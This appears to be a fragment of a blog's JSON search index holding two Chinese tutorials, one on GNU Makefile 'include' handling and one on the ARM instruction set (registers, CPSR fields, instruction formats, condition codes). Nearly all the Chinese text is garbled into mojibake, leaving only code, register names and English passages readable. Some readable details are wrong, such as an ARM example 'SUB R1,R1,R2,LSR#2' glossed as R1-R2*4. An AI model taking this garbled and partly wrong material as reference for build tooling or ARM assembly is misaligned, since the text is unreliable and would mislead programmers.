å¯ä»¥æ˜¯å½“å‰æ“ä½œç³»ç»ŸShellçš„æ–‡ä»¶æ¨¡å¼ï¼ˆå¯ä»¥åŒ…å«è·¯å¾„å’Œé€šé…ç¬¦ï¼‰ã€‚\nåœ¨ include å‰é¢å¯ä»¥æœ‰ä¸€äº›ç©ºå­—ç¬¦ï¼Œä½†æ˜¯ç»ä¸èƒ½æ˜¯ Tab é”®å¼€å§‹ã€‚ include å’Œ \u003cfilename\u003e å¯ä»¥ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼éš”å¼€ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä½ æœ‰è¿™æ ·å‡ ä¸ªMakefileï¼š a.mk ã€ b.mk ã€ c.mk ï¼Œè¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶å« foo.make ï¼Œä»¥åŠä¸€ä¸ªå˜é‡ $(bar) ï¼Œå…¶åŒ…å« äº† e.mk å’Œ f.mk ï¼Œé‚£ä¹ˆï¼Œä¸‹é¢çš„è¯­å¥ï¼š\n1 2  bar\t=\te.mk\tf.mk include foo.make *.mk $(bar)   ç­‰ä»·äºï¼š\n1  include foo.make a.mk b.mk c.mk e.mk f.mk   makeå‘½ä»¤å¼€å§‹æ—¶ï¼Œä¼šæ‰¾å¯» include æ‰€æŒ‡å‡ºçš„å…¶å®ƒMakefileï¼Œå¹¶æŠŠå…¶å†…å®¹å®‰ç½®åœ¨å½“å‰çš„ä½ç½®ã€‚å°±å¥½ åƒC/C++çš„ #include æŒ‡ä»¤ä¸€æ ·ã€‚å¦‚æœæ–‡ä»¶éƒ½æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„æˆ–æ˜¯ç›¸å¯¹è·¯å¾„çš„è¯ï¼Œmakeä¼šåœ¨å½“å‰ç›® å½•ä¸‹é¦–å…ˆå¯»æ‰¾ï¼Œå¦‚æœå½“å‰ç›®å½•ä¸‹æ²¡æœ‰æ‰¾åˆ°ï¼Œé‚£ä¹ˆï¼Œmakeè¿˜ä¼šåœ¨ä¸‹é¢çš„å‡ ä¸ªç›®å½•ä¸‹æ‰¾ï¼š\n å¦‚æœmakeæ‰§è¡Œæ—¶ï¼Œæœ‰ -I æˆ– --include-dir å‚æ•°ï¼Œé‚£ä¹ˆmakeå°±ä¼šåœ¨è¿™ä¸ªå‚æ•°æ‰€æŒ‡å®šçš„ç›® å½•ä¸‹å»å¯»æ‰¾ã€‚ å¦‚æœç›®å½• \u003cprefix\u003e/include ï¼ˆä¸€èˆ¬æ˜¯ï¼š /usr/local/bin æˆ– /usr/include ï¼‰å­˜åœ¨çš„è¯ï¼Œmakeä¹Ÿä¼šå»æ‰¾ã€‚  å¦‚æœæœ‰æ–‡ä»¶æ²¡æœ‰æ‰¾åˆ°çš„è¯ï¼Œmakeä¼šç”Ÿæˆä¸€æ¡è­¦å‘Šä¿¡æ¯ï¼Œä½†ä¸ä¼šé©¬ä¸Šå‡ºç°è‡´å‘½é”™è¯¯ã€‚å®ƒä¼šç»§ç»­è½½å…¥å…¶å®ƒçš„ æ–‡ä»¶ï¼Œä¸€æ—¦å®Œæˆmakefileçš„è¯»å–ï¼Œmakeä¼šå†é‡è¯•è¿™äº›æ²¡æœ‰æ‰¾åˆ°ï¼Œæˆ–æ˜¯ä¸èƒ½è¯»å–çš„æ–‡ä»¶ï¼Œå¦‚æœè¿˜æ˜¯ ä¸è¡Œï¼Œmakeæ‰ä¼šå‡ºç°ä¸€æ¡è‡´å‘½ä¿¡æ¯ã€‚å¦‚æœä½ æƒ³è®©makeä¸ç†é‚£äº›æ— æ³•è¯»å–çš„æ–‡ä»¶ï¼Œè€Œç»§ç»­æ‰§è¡Œï¼Œä½ å¯ä»¥ åœ¨includeå‰åŠ ä¸€ä¸ªå‡å·â€œ-â€ã€‚å¦‚ï¼š\n-include \u003cfilename\u003e å…¶è¡¨ç¤ºï¼Œæ— è®ºincludeè¿‡ç¨‹ä¸­å‡ºç°ä»€ä¹ˆé”™è¯¯ï¼Œéƒ½ä¸è¦æŠ¥é”™ç»§ç»­æ‰§è¡Œã€‚å’Œå…¶å®ƒç‰ˆæœ¬makeå…¼å®¹çš„ç›¸å…³å‘½ä»¤ æ˜¯sincludeï¼Œå…¶ä½œç”¨å’Œè¿™ä¸€ä¸ªæ˜¯ä¸€æ ·çš„ã€‚\nç¯å¢ƒå˜é‡MAKEFILES å¦‚æœä½ çš„å½“å‰ç¯å¢ƒä¸­å®šä¹‰äº†ç¯å¢ƒå˜é‡ MAKEFILES ï¼Œé‚£ä¹ˆï¼Œmakeä¼šæŠŠè¿™ä¸ªå˜é‡ä¸­çš„å€¼åšä¸€ä¸ªç±»ä¼¼äºinclude çš„åŠ¨ä½œã€‚è¿™ä¸ªå˜é‡ä¸­çš„å€¼æ˜¯å…¶å®ƒçš„Makefileï¼Œç”¨ç©ºæ ¼åˆ†éš”ã€‚åªæ˜¯ï¼Œå®ƒå’Œ include ä¸ åŒçš„æ˜¯ï¼Œä»è¿™ä¸ªç¯å¢ƒå˜é‡ä¸­å¼•å…¥çš„Makefileçš„â€œç›®æ ‡â€ä¸ä¼šèµ·ä½œç”¨ï¼Œå¦‚æœç¯å¢ƒå˜é‡ä¸­å®šä¹‰çš„æ–‡ä»¶å‘ç° é”™è¯¯ï¼Œmakeä¹Ÿä¼šä¸ç†ã€‚\nä½†æ˜¯åœ¨è¿™é‡Œæˆ‘è¿˜æ˜¯å»ºè®®ä¸è¦ä½¿ç”¨è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œå› ä¸ºåªè¦è¿™ä¸ªå˜é‡ä¸€è¢«å®šä¹‰ï¼Œé‚£ä¹ˆå½“ä½ ä½¿ç”¨makeæ—¶ï¼Œ æ‰€æœ‰çš„Makefileéƒ½ä¼šå—åˆ°å®ƒçš„å½±å“ï¼Œè¿™ç»ä¸æ˜¯ä½ æƒ³çœ‹åˆ°çš„ã€‚åœ¨è¿™é‡Œæè¿™ä¸ªäº‹ï¼Œåªæ˜¯ä¸ºäº†å‘Šè¯‰å¤§å®¶ï¼Œä¹Ÿè®¸ æœ‰æ—¶å€™ä½ çš„Makefileå‡ºç°äº†æ€ªäº‹ï¼Œé‚£ä¹ˆä½ å¯ä»¥çœ‹çœ‹å½“å‰ç¯å¢ƒä¸­æœ‰æ²¡æœ‰å®šä¹‰è¿™ä¸ªå˜é‡ã€‚\nmakeçš„å·¥ä½œæµç¨‹ GNUçš„makeå·¥ä½œæ—¶çš„æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼šï¼ˆæƒ³æ¥å…¶å®ƒçš„makeä¹Ÿæ˜¯ç±»ä¼¼ï¼‰\n è¯»å…¥æ‰€æœ‰çš„Makefileã€‚ è¯»å…¥è¢«includeçš„å…¶å®ƒMakefileã€‚ åˆå§‹åŒ–æ–‡ä»¶ä¸­çš„å˜é‡ã€‚ æ¨å¯¼éšæ™¦è§„åˆ™ï¼Œå¹¶åˆ†ææ‰€æœ‰è§„åˆ™ã€‚ ä¸ºæ‰€æœ‰çš„ç›®æ ‡æ–‡ä»¶åˆ›å»ºä¾èµ–å…³ç³»é“¾ã€‚ æ ¹æ®ä¾èµ–å…³ç³»ï¼Œå†³å®šå“ªäº›ç›®æ ‡è¦é‡æ–°ç”Ÿæˆã€‚ æ‰§è¡Œç”Ÿæˆå‘½ä»¤ã€‚  1-5æ­¥ä¸ºç¬¬ä¸€ä¸ªé˜¶æ®µï¼Œ6-7ä¸ºç¬¬äºŒä¸ªé˜¶æ®µã€‚ç¬¬ä¸€ä¸ªé˜¶æ®µä¸­ï¼Œå¦‚æœå®šä¹‰çš„å˜é‡è¢«ä½¿ç”¨äº†ï¼Œé‚£ä¹ˆï¼Œmakeä¼šæŠŠå…¶å±• å¼€åœ¨ä½¿ç”¨çš„ä½ç½®ã€‚ä½†makeå¹¶ä¸ä¼šå®Œå…¨é©¬ä¸Šå±•å¼€ï¼Œmakeä½¿ç”¨çš„æ˜¯æ‹–å»¶æˆ˜æœ¯ï¼Œå¦‚æœå˜é‡å‡ºç°åœ¨ä¾èµ–å…³ç³»çš„è§„åˆ™ ä¸­ï¼Œé‚£ä¹ˆä»…å½“è¿™æ¡ä¾èµ–è¢«å†³å®šè¦ä½¿ç”¨äº†ï¼Œå˜é‡æ‰ä¼šåœ¨å…¶å†…éƒ¨å±•å¼€ã€‚\nå½“ç„¶ï¼Œè¿™ä¸ªå·¥ä½œæ–¹å¼ä½ ä¸ä¸€å®šè¦æ¸…æ¥šï¼Œä½†æ˜¯çŸ¥é“è¿™ä¸ªæ–¹å¼ä½ ä¹Ÿä¼šå¯¹makeæ›´ä¸ºç†Ÿæ‚‰ã€‚æœ‰äº†è¿™ä¸ªåŸºç¡€ï¼Œåç»­éƒ¨åˆ† ä¹Ÿå°±å®¹æ˜“çœ‹æ‡‚äº†ã€‚\nä¹¦å†™è§„åˆ™ ","description":"","tags":["c++","make"],"title":"Makefile","uri":"/posts/makefile/"},{"categories":["arm"],"content":"ARMæŒ‡ä»¤é›†è¯¦è§£  å¼•ç”¨ï¼š\nARMæŒ‡ä»¤é›†è¯¦è§£\n 1. æ±‡ç¼– 1.1. é€šç”¨å¯„å­˜å™¨   å¯„å­˜å™¨ç±»åˆ« å¯„å­˜å™¨åœ¨æ±‡ç¼–ä¸­çš„åç§° å„æ¨¡å¼ä¸‹å®é™…è®¿é—®çš„å¯„å­˜å™¨           ç”¨æˆ· ç³»ç»Ÿ ç®¡ç† ä¸­æ­¢ æœªå®šä¹‰ ä¸­æ–­ å¿«ä¸­æ–­   é€šç”¨å¯„å­˜å™¨å’Œç¨‹åºè®¡æ•°å™¨ R0(a1) R0          R1(a2) R1          R2(a3) R2          R3(a4) R3          R4(v1) R4          R5(v2) R5          R6(v3) R6          R7(v4) R7          R8(v5) R8      R8_fiq *    R9(SB,v6) R9      R9_fiq *    R10(SL,v7) R10      R10_fiq *    R11(FP,v8) R11      R11_fiq *    R12(IP) R12      R12_fiq *    R13(SP) R13  R13_svc* R13_abt * R13_und * R13_irq * R13_fiq *    R14(LR) R14  R14_svc * R14_abt * R14_und * R14_irq * R14_fiq *    R15(PC) R15         çŠ¶æ€å¯„å­˜å™¨ R16(CPSR) CPSR          SPSR æ—   SPSR_svc SPSR_abt SPSR_und SPSR_irq SPSR_fiq      é€šç”¨å¯„å­˜å™¨\n37ä¸ªå¯„å­˜å™¨ï¼Œ31ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œ6ä¸ªçŠ¶æ€å¯„å­˜å™¨ã€‚\nR12æ˜¯å†…éƒ¨è°ƒç”¨æš‚æ—¶å¯„å­˜å™¨ ipã€‚å®ƒåœ¨è¿‡ç¨‹é“¾æ¥èƒ¶åˆä»£ç ï¼ˆä¾‹å¦‚ï¼Œäº¤äº’æ“ä½œèƒ¶åˆä»£ç ï¼‰ä¸­ç”¨äºæ­¤è§’è‰²ã€‚åœ¨è¿‡ç¨‹è°ƒç”¨ä¹‹é—´ï¼Œå¯ä»¥å°†å®ƒç”¨äºä»»ä½•ç”¨é€”ã€‚è¢«è°ƒç”¨å‡½æ•°åœ¨è¿”å›ä¹‹å‰ä¸å¿…æ¢å¤ r12ã€‚\nR13å †æ ˆæŒ‡é’ˆspï¼ŒR14è¿”å›æŒ‡é’ˆï¼ŒR15ä¸ºPCæŒ‡é’ˆ, cpsr_cä»£è¡¨çš„æ˜¯è¿™32ä½ä¸­çš„ä½8ä½ï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶ä½\nCPSRæœ‰4ä¸ª8ä½åŒºåŸŸï¼šæ ‡å¿—åŸŸï¼ˆFï¼‰ã€çŠ¶æ€åŸŸï¼ˆSï¼‰ã€æ‰©å±•åŸŸï¼ˆXï¼‰ã€æ§åˆ¶åŸŸï¼ˆCï¼‰ MSR - Load specified fields of the CPSR or SPSR with an immediate constant, orfrom the contents of a general-purpose register. Syntax: MSR{cond} _, #immed_8rMSR{cond} _, Rm where: cond is an optional condition code. is either CPSR orSPSR. specifies the field or fields to be moved. can be one or more of: ccontrol field mask byte (PSR[7:0]) x extension field mask byte (PSR[15:8]) sstatus field mask byte (PSR[23:16) f flags field mask byte (PSR[31:24]).immed_8r is an expression evaluating to a numeric constant. The constant mustcorrespond to an 8-bit pattern rotated by an even number of bits within a32-bit word. Rm is the source register.\nC æ§åˆ¶åŸŸå±è”½å­—èŠ‚(psr[7:0])\nX æ‰©å±•åŸŸå±è”½å­—èŠ‚(psr[15:8])\nS çŠ¶æ€åŸŸå±è”½å­—èŠ‚(psr[23:16])\nF æ ‡å¿—åŸŸå±è”½å­—èŠ‚(psr[31:24])\nCPSRå¯„å­˜å™¨\nFIQå’ŒIRQçš„åŒºåˆ«ï¼Ÿ\n   MODE(ä»¥ä¸‹ä¸ºäºŒè¿›åˆ¶)  å¯è§çš„ARMçŠ¶æ€å¯„å­˜å™¨     10000 ç”¨æˆ·æ¨¡å¼ PC,CPSR,R0~R14   10001 FIQ PC,CPSR,SPSR_fiqï¼ŒR14_fiq~R8_fiq,R7~R0   10010 IRQ PC,CPSR,SPSR_irqï¼ŒR14_irq~R13_irq,R12~R0   10011 ç®¡ç†æ¨¡å¼(svc) PC,CPSR,SPSR_svcï¼ŒR14_svc~R13_svc,R12~R0   10111 ç»ˆæ­¢æ¨¡å¼ PC,CPSR,SPSR_abtï¼ŒR14_abt~R13_abt,R12~R0   11011 æœªå®šä¹‰ PC,CPSR,SPSR_undï¼ŒR14_und~R13_und,R2~R0   11111 ç³»ç»Ÿæ¨¡å¼(sys) PC,CPSRï¼ŒR14 ~R0    1.2. æŒ‡ä»¤æ ¼å¼  åŸºæœ¬æ ¼å¼  â€‹  \u003copcode\u003e{\u003ccond\u003e}{S} \u003cRd\u003e,\u003cRn\u003e{,\u003copcode2\u003e}\nâ€‹ å…¶ä¸­ï¼Œ\u003c\u003eå†…çš„é¡¹æ˜¯å¿…é¡»çš„ï¼Œ{}å†…çš„é¡¹æ˜¯å¯é€‰çš„ï¼Œå¦‚æ˜¯æŒ‡ä»¤åŠ©è®°ç¬¦ï¼Œæ˜¯å¿…é¡»çš„ï¼Œè€Œ{}ä¸ºæŒ‡ä»¤æ‰§è¡Œæ¡ä»¶ï¼Œæ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸å†™åˆ™ä½¿ç”¨é»˜è®¤æ¡ä»¶AL(æ— æ¡ä»¶æ‰§è¡Œ)ã€‚\nâ€‹ opcode æŒ‡ä»¤åŠ©è®°ç¬¦ï¼Œå¦‚LDRï¼ŒSTR ç­‰\nâ€‹ cond æ‰§è¡Œæ¡ä»¶ï¼Œå¦‚EQï¼ŒNE ç­‰\nâ€‹ S æ˜¯å¦å½±å“CPSR å¯„å­˜å™¨çš„å€¼ï¼Œä¹¦å†™æ—¶å½±å“CPSRï¼Œå¦åˆ™ä¸å½±å“\nâ€‹ Rd ç›®æ ‡å¯„å­˜å™¨\nâ€‹ Rn ç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„å¯„å­˜å™¨\nâ€‹ operand2 ç¬¬äºŒä¸ªæ“ä½œæ•°\nâ€‹ æŒ‡ä»¤æ ¼å¼ä¸¾ä¾‹å¦‚ä¸‹ï¼š\nâ€‹ LDREX--è¿™æ¡æŒ‡ä»¤ä¸»è¦æ˜¯ä»memoryä¸­å–ä¸€ä¸ªæ•°ï¼Œç„¶åæ”¾åˆ°registerä¸­ï¼Œä½†æ˜¯ç›¸æ¯”æ™®é€šçš„LDRæŒ‡ä»¤ï¼Œåœ¨äºå…¶å†…åœ¨çš„åŸå­æ“ä½œç‰¹æ€§, ä¿¡å·é‡å’Œspin lockè¿™äº›ä¸œè¥¿æœ€æ ¸å¿ƒçš„äº‹æƒ…åŸºæœ¬ä¸Šå°±æ˜¯load-update-storeåºåˆ—ï¼Œä¸ºäº†é˜²æ­¢å¹¶å‘ï¼Œå¿…é¡»ä¿è¯è¿™ä¸ªåºåˆ—æ˜¯åŸå­çš„ï¼Œæ‰€è°“åŸå­ï¼Œå³å¤„ç†å™¨åœ¨æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤åºåˆ—æ—¶ï¼Œå¾—ç»å¯¹å æœ‰å¤„ç†å™¨è€Œä¸èƒ½å¤Ÿè¢«åˆ‡æ¢å‡ºå»ã€‚åœ¨ARMä¸Šï¼Œä»V6å¼€å§‹ï¼ŒæŒ‡ä»¤LDREXå’ŒSTREXå°±æ˜¯ç”¨æ¥å¹²è¿™äº‹çš„\nâ€‹ LDR R0,[R1] ;è¯»å–R1 åœ°å€ä¸Šçš„å­˜å‚¨å™¨å•å…ƒå†…å®¹ï¼Œæ‰§è¡Œæ¡ä»¶AL â€‹ BEQ DATAEVEN ;è·³è½¬æŒ‡ä»¤ï¼Œæ‰§è¡Œæ¡ä»¶EQï¼Œå³ç›¸ç­‰è·³è½¬åˆ°DATAEVEN â€‹ ADDS R1,R1,#1 ;åŠ æ³•æŒ‡ä»¤ï¼ŒR1ï¼‹1ï¼R1 å½±å“CPSR å¯„å­˜å™¨ï¼Œå¸¦æœ‰S â€‹ SUBNES R1,R1,#0xD;æ¡ä»¶æ‰§è¡Œå‡æ³•è¿ç®—(NE)ï¼ŒR1-0xD=\u003eR1ï¼Œå½±å“CPSR å¯„å­˜å™¨ï¼Œå¸¦æœ‰S\nç¬¬2ä¸ªæ“ä½œæ•°  â€‹ åœ¨ARM æŒ‡ä»¤ä¸­ï¼Œçµæ´»çš„ä½¿ç”¨ç¬¬2ä¸ªæ“ä½œæ•°èƒ½æé«˜ä»£ç æ•ˆç‡ï¼Œç¬¬2ä¸ªæ“ä½œæ•°çš„å½¢å¼å¦‚ä¸‹ï¼š\nâ€‹ ï¼ƒimmed_8r\nâ€‹ å¸¸æ•°è¡¨è¾¾å¼ï¼š\nâ€‹ è¯¥å¸¸æ•°å¿…é¡»å¯¹åº”8 ä½ä½å›¾ï¼Œå³å¸¸æ•°æ˜¯ç”±ä¸€ä¸ª8 ä½çš„å¸¸æ•°å¾ªç¯ç§»ä½å¶æ•°ä½å¾—åˆ°ã€‚\nâ€‹ åˆæ³•å¸¸é‡ï¼š\nâ€‹ 0x3FCã€0ã€0xF0000000ã€200ã€0xF0000001ç­‰éƒ½æ˜¯åˆæ³•å¸¸é‡ã€‚\nâ€‹ éæ³•å¸¸é‡ï¼š\nâ€‹ 0x1FEã€511ã€0xFFFFã€0x1010ã€0xF0000010ç­‰éƒ½æ˜¯éæ³•å¸¸é‡ã€‚\nâ€‹\tå¸¸æ•°è¡¨è¾¾å¼åº”ç”¨ä¸¾ä¾‹å¦‚ä¸‹ï¼š\nâ€‹ MOV R0,#1 ;R0=1\nâ€‹ AND R1,R2,#0x0F ;R2 ä¸0x0Fï¼Œç»“æœä¿å­˜åœ¨R1\nâ€‹ LDR R0ï¼Œ[R1],#-4 ;è¯»å–R1 åœ°å€ä¸Šçš„å­˜å‚¨å™¨å•å…ƒå†…å®¹ï¼Œä¸”R1ï¼R1ï¼4\nâ€‹ Rm\nâ€‹ å¯„å­˜å™¨æ–¹å¼ï¼Œåœ¨å¯„å­˜å™¨æ–¹å¼ä¸‹æ“ä½œæ•°å³ä¸ºå¯„å­˜å™¨çš„æ•°å€¼ã€‚\nâ€‹ å¯„å­˜å™¨æ–¹å¼åº”ç”¨ä¸¾ä¾‹ï¼š\nâ€‹ SUB R1ï¼ŒR1ï¼ŒR2 ï¼›R1-R2=ï¼R1\nâ€‹ MOV PCï¼ŒR0 ï¼›PC=R0ï¼Œç¨‹åºè·³è½¬åˆ°æŒ‡å®šåœ°å€\nâ€‹ LDR R0ï¼Œ[R1]ï¼Œ-R2 ï¼›è¯»å–R1 åœ°å€ä¸Šçš„å­˜å‚¨å™¨å•å…ƒå†…å®¹å¹¶å­˜å…¥R0ï¼Œä¸”R1=R1-R2\nâ€‹ Rmï¼Œ shift\nâ€‹ å¯„å­˜å™¨ç§»ä½æ–¹å¼ã€‚å°†å¯„å­˜å™¨çš„ç§»ä½ç»“æœä½œä¸ºæ“ä½œæ•°ï¼Œä½†RM å€¼ä¿å­˜ä¸å˜ï¼Œç§»ä½æ–¹æ³•å¦‚ä¸‹ï¼š\nâ€‹ ASR #n ç®—æœ¯å³ç§»n ä½ï¼ˆ1â‰¤nâ‰¤32ï¼‰\nâ€‹ LSL #n é€»è¾‘å·¦ç§»n ä½ï¼ˆ1â‰¤nâ‰¤31ï¼‰\nâ€‹ LSR #n é€»è¾‘å·¦ç§»n ä½ï¼ˆ1â‰¤nâ‰¤32ï¼‰\nâ€‹ ROR #n å¾ªç¯å³ç§»n ä½ï¼ˆ1â‰¤nâ‰¤31ï¼‰\nâ€‹ RRX å¸¦æ‰©å±•çš„å¾ªç¯å³ç§»1ä½\nâ€‹ type Rs å…¶ä¸­ï¼Œtype ä¸ºASRï¼ŒLSLï¼Œå’ŒROR ä¸­çš„ä¸€ç§ï¼›Rs åç§»é‡å¯„å­˜å™¨ï¼Œä½8ä½æœ‰æ•ˆï¼Œè‹¥å…¶å€¼å¤§äºæˆ–ç­‰äº32ï¼Œåˆ™ç¬¬2 ä¸ªæ“ä½œæ•°çš„ç»“æœä¸º0ï¼ˆASRã€RORä¾‹å¤–ï¼‰ã€‚ â€‹ å¯„å­˜å™¨åç§»æ–¹å¼åº”ç”¨ä¸¾ä¾‹ï¼š\nâ€‹ ADD R1ï¼ŒR1ï¼ŒR1ï¼ŒLSL #3 ï¼›R1=R1*9\nâ€‹ SUB R1ï¼ŒR1ï¼ŒR2ï¼ŒLSR#2 ï¼›R1=R1-R2*4\nâ€‹ R15 ä¸ºå¤„ç†å™¨çš„ç¨‹åºè®¡æ•°å™¨PCï¼Œä¸€èˆ¬ä¸è¦å¯¹å…¶è¿›è¡Œæ“ä½œï¼Œè€Œä¸”æœ‰äº›æŒ‡ä»¤æ˜¯ä¸å…è®¸ä½¿ç”¨R15ï¼Œå¦‚UMULL æŒ‡ä»¤ã€‚ â€‹ ï¼ˆ3ï¼‰æ¡ä»¶ç  â€‹ ä½¿ç”¨æŒ‡ä»¤æ¡ä»¶ç ï¼Œå¯å®ç°é«˜æ•ˆçš„é€»è¾‘æ“ä½œï¼Œæé«˜ä»£ç æ•ˆç‡ã€‚è¡¨A-1ç»™å‡ºæ¡ä»¶ç è¡¨ã€‚\nè¡¨A-1 æ¡ä»¶ç è¡¨\nâ€‹ å¯¹äºThumbæŒ‡ä»¤é›†ï¼Œåªæœ‰B æŒ‡ä»¤å…·æœ‰æ¡ä»¶ç æ‰§è¡ŒåŠŸèƒ½ï¼Œæ­¤æŒ‡ä»¤æ¡ä»¶ç åŒè¡¨A-?ï¼Œä½†å¦‚æœä¸ºæ— æ¡ä»¶æ‰§è¡Œæ—¶ï¼Œæ¡ä»¶ç åŠ©è®°ç¬¦â€œALâ€ä¸åœ¨æŒ‡ä»¤ä¸­ä¹¦å†™ã€‚\nâ€‹ æ¡ä»¶ç åº”ç”¨ä¸¾ä¾‹å¦‚ä¸‹ï¼š\nâ€‹ æ¯”è¾ƒä¸¤ä¸ªå€¼å¤§å°ï¼Œå¹¶è¿›è¡Œç›¸åº”åŠ 1 å¤„ç†ï¼ŒC ä»£ç ä¸ºï¼š â€‹ ifï¼ˆaï¼bï¼‰a++ ; â€‹ else b++ ; â€‹ å¯¹åº”çš„ARM æŒ‡ä»¤å¦‚ä¸‹ã€‚å…¶ä¸­R0ä¸ºaï¼ŒR1ä¸ºbã€‚ â€‹ CMP R0ï¼ŒR1 ; R0 ä¸R1 æ¯”è¾ƒ â€‹ ADDHI R0ï¼ŒR0ï¼Œ#1 ; è‹¥R0ï¼R1ï¼Œåˆ™R0=R0+1 â€‹ ADDLS R1ï¼ŒR1ï¼Œ#1 ;è‹¥R0ï¼œ=R1ï¼Œåˆ™R1=R1+1 â€‹ è‹¥ä¸¤ä¸ªæ¡ä»¶å‡æˆç«‹ï¼Œåˆ™å°†è¿™ä¸¤ä¸ªæ•°å€¼ç›¸åŠ ï¼ŒCä»£ç ä¸ºï¼š\nâ€‹ If(ï¼ˆa!=10ï¼‰\u0026\u0026(b!=20))a=a+b;\nâ€‹ å¯¹åº”çš„ARM æŒ‡ä»¤å¦‚ä¸‹ï¼Œå…¶ä¸­R0 ä¸ºaï¼ŒR1ä¸ºbã€‚ â€‹ CMP R0,#10 ; æ¯”è¾ƒR0 æ˜¯å¦ä¸º10 â€‹ CMPNE R1,#20 ; è‹¥R0 ä¸ä¸º10ï¼Œåˆ™æ¯”è¾ƒR1 æ˜¯å¦20 â€‹ ADDNE R0,R0,R1 ; è‹¥R0 ä¸ä¸º10 ä¸”R1 ä¸ä¸º20ï¼ŒæŒ‡ä»¤æ‰§è¡Œï¼ŒR0=R0+R1\n1.3. æŒ‡ä»¤é›† 1.3.1. ARM å­˜å‚¨å™¨è®¿é—®æŒ‡ä»¤ â€‹ ARM å¤„ç†æ˜¯åŠ è½½/å­˜å‚¨ä½“ç³»ç»“æ„çš„å…¸å‹çš„RISCå¤„ç†å™¨ï¼Œå¯¹å­˜å‚¨å™¨çš„è®¿é—®åªèƒ½ä½¿ç”¨åŠ è½½å’Œå­˜å‚¨æŒ‡ä»¤å®ç°ã€‚ARM çš„åŠ è½½/å­˜å‚¨æŒ‡ä»¤æ˜¯å¯ä»¥å®ç°å­—ã€åŠå­—ã€æ— ç¬¦/æœ‰ç¬¦å­—èŠ‚æ“ä½œï¼›æ‰¹é‡åŠ è½½/å­˜å‚¨æŒ‡ä»¤å¯å®ç°ä¸€æ¡æŒ‡ä»¤åŠ è½½/å­˜å‚¨å¤šä¸ªå¯„å­˜å™¨çš„å†…å®¹ï¼Œå¤§å¤§æé«˜æ•ˆç‡ï¼›SWPæŒ‡ä»¤æ˜¯ä¸€æ¡å¯„å­˜å™¨å’Œå­˜å‚¨å™¨å†…å®¹äº¤æ¢çš„æŒ‡ä»¤ï¼Œå¯ç”¨äºä¿¡å·é‡æ“ä½œç­‰ã€‚ARM å¤„ç†å™¨æ˜¯å†¯?è¯ºä¾æ›¼å­˜å‚¨ç»“æ„ï¼Œç¨‹åºç©ºé—´ã€RAM ç©ºé—´åŠIO æ˜ å°„ç©ºé—´ç»Ÿä¸€ç¼–å€ï¼Œé™¤å¯¹å¯¹RAM æ“ä½œä»¥å¤–ï¼Œå¯¹å¤–å›´IOã€ç¨‹åºæ•°æ®çš„è®¿é—®å‡è¦é€šè¿‡åŠ è½½/å­˜å‚¨æŒ‡ä»¤è¿›è¡Œã€‚è¡¨A-2ç»™å‡ºARMå­˜å‚¨è®¿é—®æŒ‡ä»¤è¡¨ã€‚\nè¡¨A-2 ARM å­˜å‚¨è®¿é—®æŒ‡ä»¤è¡¨\nLDR å’ŒSTR â€‹ åŠ è½½/å­˜å‚¨å­—å’Œæ— ç¬¦å·å­—èŠ‚æŒ‡ä»¤ã€‚ä½¿ç”¨å•ä¸€æ•°æ®ä¼ é€æŒ‡ä»¤(STR å’ŒLDR)æ¥è£…è½½å’Œå­˜å‚¨å•ä¸€å­—èŠ‚æˆ–å­—çš„æ•°æ®ä»/åˆ°å†…å­˜ã€‚LDRæŒ‡ä»¤ç”¨äºä»å†…å­˜ä¸­è¯»å–æ•°æ®æ”¾å…¥å¯„å­˜å™¨ä¸­ï¼›STR æŒ‡ä»¤ç”¨äºå°†å¯„å­˜å™¨ä¸­çš„æ•°æ®ä¿å­˜åˆ°å†…å­˜ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ LDR{cond}{T} Rd,\u003cåœ°å€\u003e;  åŠ è½½æŒ‡å®šåœ°å€ä¸Šçš„æ•°æ®(å­—)ï¼Œæ”¾å…¥Rdä¸­ â€‹ STR{cond}{T} Rd,\u003cåœ°å€\u003e; å­˜å‚¨æ•°æ®(å­—)åˆ°æŒ‡å®šåœ°å€çš„å­˜å‚¨å•å…ƒï¼Œè¦å­˜å‚¨çš„æ•°æ®åœ¨Rdä¸­ â€‹ LDR{cond}B{T} Rd,\u003cåœ°å€\u003e; åŠ è½½å­—èŠ‚æ•°æ®ï¼Œæ”¾å…¥Rdä¸­ï¼Œå³Rdæœ€ä½å­—èŠ‚æœ‰æ•ˆï¼Œé«˜24ä½æ¸…é›¶ â€‹ STR{cond}B{T} Rd,\u003cåœ°å€\u003e; å­˜å‚¨å­—èŠ‚æ•°æ®ï¼Œè¦å­˜å‚¨çš„æ•°æ®åœ¨Rdï¼Œæœ€ä½å­—èŠ‚æœ‰æ•ˆ â€‹ å…¶ä¸­ï¼ŒT ä¸ºå¯é€‰åç¼€ï¼Œè‹¥æŒ‡ä»¤æœ‰Tï¼Œé‚£ä¹ˆå³ä½¿å¤„ç†å™¨æ˜¯åœ¨ç‰¹æƒæ¨¡å¼ä¸‹ï¼Œå­˜å‚¨ç³»ç»Ÿä¹Ÿå°†è®¿é—®çœ‹æˆæ˜¯å¤„ç†å™¨æ˜¯åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ã€‚Tåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ— æ•ˆï¼Œä¸èƒ½ä¸å‰ç´¢å¼•åç§»ä¸€èµ·ä½¿ç”¨Tã€‚ â€‹ LDR/STR æŒ‡ä»¤å¯»å€æ˜¯éå¸¸çµæ´»çš„ï¼Œç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†ä¸ºä¸€ä¸ªåŸºå€å¯„å­˜å™¨ï¼Œå¯ä»¥ä¸ºä»»ä¸€ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œå¦ä¸€éƒ¨åˆ†ä¸ºä¸€ä¸ªåœ°å€åç§»é‡ã€‚åœ°å€åç§»é‡æœ‰ä»¥ä¸‹3ç§æ ¼å¼ï¼š 